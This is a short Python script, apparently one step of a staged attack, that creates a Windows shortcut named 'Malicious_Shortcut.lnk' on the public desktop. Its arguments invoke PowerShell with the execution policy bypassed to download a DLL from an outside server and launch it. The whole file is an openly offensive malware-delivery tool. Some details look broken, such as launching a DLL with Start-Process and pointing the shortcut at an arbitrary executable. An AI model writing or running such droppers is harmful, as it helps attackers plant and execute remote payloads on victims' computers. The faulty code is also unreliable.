import os
import sys
import win32com.client

def create_shortcut(exe_path, dll_url, shortcut_path):
    # Initialize COM object for creating shortcut
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortcut(shortcut_path)

    # Set the properties of the shortcut
    shortcut.TargetPath = exe_path
    shortcut.Arguments = f"-ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri '{dll_url}' -OutFile 'C:\\path\\to\\downloaded.dll'; Start-Process 'C:\\path\\to\\downloaded.dll'\""
    shortcut.WorkingDirectory = os.path.dirname(exe_path)
    shortcut.IconLocation = exe_path
    shortcut.save()

# Example usage
exe_path = r"C:\path\to\valid_executable.exe"  # Path to the executable identified in Phase 1
dll_url = "http://your_server.com/path/to/dll"  # URL to the DLL (generated in Phase 2)
shortcut_path = r"C:\Users\Public\Desktop\Malicious_Shortcut.lnk"  # Path to save the .LNK file

create_shortcut(exe_path, dll_url, shortcut_path)
print("Shortcut created successfully!")
